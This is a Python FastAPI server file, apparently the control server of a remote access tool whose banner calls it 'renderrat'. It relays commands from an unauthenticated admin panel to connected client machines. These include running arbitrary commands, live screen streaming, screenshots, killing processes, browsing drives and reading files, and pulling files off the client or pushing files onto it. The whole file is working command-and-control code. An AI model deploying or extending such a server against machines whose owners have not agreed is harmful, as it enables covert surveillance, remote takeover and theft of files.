from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse, StreamingResponse
import base64
import io
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set
import json
import os

app = FastAPI()

# ===============================
# TEMPLATES + STATIC
# ===============================

templates = Jinja2Templates(directory="templates")

if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# CONNECTIONS
# ===============================

clients: Dict[str, WebSocket] = {}
admins: Set[WebSocket] = set()

# Track which admin is watching which client (for stream routing)
admin_watching: Dict[WebSocket, str] = {}   # admin_ws → client_id

# File transfer buffer: transfer_id -> {filename, chunks, total_chunks, done}
file_transfers: Dict[str, dict] = {}

# ===============================
# PAGES
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "clients_online": len(clients),
        "admins_online": len(admins)
    }

# ===============================
# FILE DOWNLOAD ENDPOINT
# ===============================

@app.get("/download/{transfer_id}")
async def download_file(transfer_id: str):
    """Admin download file đã nhận từ Client qua HTTP GET."""
    t = file_transfers.get(transfer_id)
    if not t:
        return HTMLResponse("<h3>File not found or expired</h3>", status_code=404)
    if not t.get("done"):
        return HTMLResponse("<h3>File transfer not complete yet</h3>", status_code=425)

    # Ghép chunks
    buffer = io.BytesIO()
    for i in range(t["total_chunks"]):
        chunk = t["chunks"].get(i, "")
        buffer.write(base64.b64decode(chunk))
    buffer.seek(0)

    filename = t["filename"]
    return StreamingResponse(
        buffer,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )

# ===============================
# CLIENT WEBSOCKET
# ===============================

@app.websocket("/ws/client/{client_id}")
async def client_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")

            # ── Stream frame — forward nhanh nhất có thể ──────────
            if msg_type == "stream_frame":
                await broadcast_stream_frame(client_id, {
                    "type": "stream_frame",
                    "client_id": client_id,
                    "image": message.get("image"),
                    "ts": message.get("ts")
                })

            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "screenshot":
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": message.get("image")
                })

            # ── Command result ────────────────────────────────────
            elif msg_type == "command_result":
                await broadcast_to_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "output": message.get("output")
                })

            # ── File transfer: Client → Admin ─────────────────────
            elif msg_type in ("file_transfer_start", "file_chunk", "file_transfer_done",
                              "file_transfer_error", "file_transfer_progress"):
                transfer_id = message.get("transfer_id")

                if msg_type == "file_transfer_start":
                    file_transfers[transfer_id] = {
                        "filename": message.get("filename"),
                        "file_size": message.get("file_size"),
                        "total_chunks": message.get("total_chunks"),
                        "chunks": {},
                        "done": False,
                        "client_id": client_id
                    }
                elif msg_type == "file_chunk":
                    if transfer_id in file_transfers:
                        file_transfers[transfer_id]["chunks"][message.get("chunk_idx")] = message.get("data")
                elif msg_type == "file_transfer_done":
                    if transfer_id in file_transfers:
                        file_transfers[transfer_id]["done"] = True
                        print(f"[FILE] Transfer done: {message.get('filename')} ({message.get('file_size')} bytes)")

                # Relay progress đến admin
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "transfer_id": transfer_id,
                    "filename": message.get("filename"),
                    "file_size": message.get("file_size"),
                    "total_chunks": message.get("total_chunks"),
                    "chunk_idx": message.get("chunk_idx"),
                    "error": message.get("error")
                })

            # ── File save result (Admin → Client download kết quả) ─
            elif msg_type == "file_save_result":
                await broadcast_to_admins({
                    "type": "file_save_result",
                    "client_id": client_id,
                    "transfer_id": message.get("transfer_id"),
                    "path": message.get("path"),
                    "error": message.get("error")
                })

            # ── Client connected (sysinfo) ─────────────────────────
            elif msg_type == "client_connected":
                await broadcast_to_admins({
                    "type": "client_info",
                    "client_id": client_id,
                    "sysinfo": message.get("sysinfo")
                })

            # ── Other data (sysinfo, processes, files…) ───────────
            else:
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "data": message.get("data"),
                    "result": message.get("result"),
                    "path": message.get("path"),
                    "message": message.get("message"),
                    "status": message.get("status")
                })

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[CLIENT ERR] {client_id}: {e}")
    finally:
        if client_id in clients:
            del clients[client_id]
        # Dừng stream cho các admin đang xem client này
        await stop_stream_for_client(client_id)
        print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
        await notify_admins_clients()

# ===============================
# ADMIN WEBSOCKET
# ===============================

@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.add(websocket)
    print(f"[ADMIN +] Total: {len(admins)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")
            client_id = message.get("client_id")

            # ── Stream control ────────────────────────────────────
            if msg_type == "start_stream":
                if client_id and client_id in clients:
                    admin_watching[websocket] = client_id
                    await clients[client_id].send_text(json.dumps({
                        "type": "start_stream"
                    }))
                    print(f"[STREAM] Admin started stream → {client_id}")

            elif msg_type == "stop_stream":
                if client_id and client_id in clients:
                    if websocket in admin_watching:
                        del admin_watching[websocket]
                    # Dừng stream nếu không còn admin nào xem
                    watchers = [a for a, c in admin_watching.items() if c == client_id]
                    if not watchers:
                        await clients[client_id].send_text(json.dumps({
                            "type": "stop_stream"
                        }))
                    print(f"[STREAM] Admin stopped stream → {client_id}")

            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "request_screenshot":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot",
                        "quality": message.get("quality", 85)
                    }))

            # ── Command ───────────────────────────────────────────
            elif msg_type == "command":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": message.get("command")
                    }))

            # ── Sysinfo ───────────────────────────────────────────
            elif msg_type == "request_sysinfo":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_sysinfo"}))

            # ── Processes ─────────────────────────────────────────
            elif msg_type == "request_processes":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_processes"}))

            elif msg_type == "kill_process":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "kill_process",
                        "pid": message.get("pid")
                    }))

            # ── Files ─────────────────────────────────────────────
            elif msg_type == "list_directory":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "list_directory",
                        "path": message.get("path", ".")
                    }))

            elif msg_type == "get_drives":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "get_drives"
                    }))

            elif msg_type == "read_file":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "read_file",
                        "path": message.get("path")
                    }))

            # ── File: Admin yêu cầu Client gửi file lên ───────────
            elif msg_type == "request_file_upload":
                if client_id in clients:
                    import uuid as _uuid
                    transfer_id = message.get("transfer_id") or str(_uuid.uuid4())[:8]
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_file_upload",
                        "path": message.get("path"),
                        "transfer_id": transfer_id
                    }))
                    print(f"[FILE] Request upload: {message.get('path')} from {client_id}")

            # ── File: Admin gửi file xuống Client ─────────────────
            elif msg_type == "send_file_to_client":
                if client_id in clients:
                    # Forward toàn bộ file_transfer_start + chunks + done
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_transfer_start",
                        "transfer_id": message.get("transfer_id"),
                        "filename": message.get("filename"),
                        "file_size": message.get("file_size"),
                        "total_chunks": message.get("total_chunks"),
                        "save_dir": message.get("save_dir", ".")
                    }))

            elif msg_type in ("send_chunk_to_client",):
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_chunk",
                        "transfer_id": message.get("transfer_id"),
                        "chunk_idx": message.get("chunk_idx"),
                        "total_chunks": message.get("total_chunks"),
                        "data": message.get("data")
                    }))

            elif msg_type == "finish_file_to_client":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "file_transfer_done",
                        "transfer_id": message.get("transfer_id"),
                        "filename": message.get("filename"),
                        "file_size": message.get("file_size")
                    }))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ADMIN ERR] {e}")
    finally:
        admins.discard(websocket)
        # Dừng stream nếu admin đang xem
        if websocket in admin_watching:
            client_id = admin_watching.pop(websocket)
            watchers = [a for a, c in admin_watching.items() if c == client_id]
            if not watchers and client_id in clients:
                await clients[client_id].send_text(json.dumps({"type": "stop_stream"}))
        print(f"[ADMIN -] Total: {len(admins)}")

# ===============================
# HELPERS
# ===============================

async def notify_admins_clients():
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

async def broadcast_to_admins(message: dict):
    dead = set()
    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)

async def broadcast_stream_frame(client_id: str, message: dict):
    """Chỉ gửi stream frame cho admin đang xem client này"""
    dead = set()
    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
    payload = json.dumps(message)
    for admin in watchers:
        try:
            await admin.send_text(payload)
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)
        admin_watching.pop(d, None)

async def stop_stream_for_client(client_id: str):
    """Notify admins đang xem client vừa disconnect"""
    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
    for admin in watching_admins:
        admin_watching.pop(admin, None)
        try:
            await admin.send_text(json.dumps({
                "type": "stream_stopped",
                "client_id": client_id,
                "reason": "client_disconnected"
            }))
        except Exception:
            pass

# ===============================
# STARTUP
# ===============================

@app.on_event("startup")
async def startup_event():
    print("=" * 50)
    print("  Server Started!")
    print("=" * 50)
    print("  Admin : https://renderrat.onrender.com")
    print("  Client: wss://renderrat.onrender.com/ws/client/{id}")
    print("=" * 50)
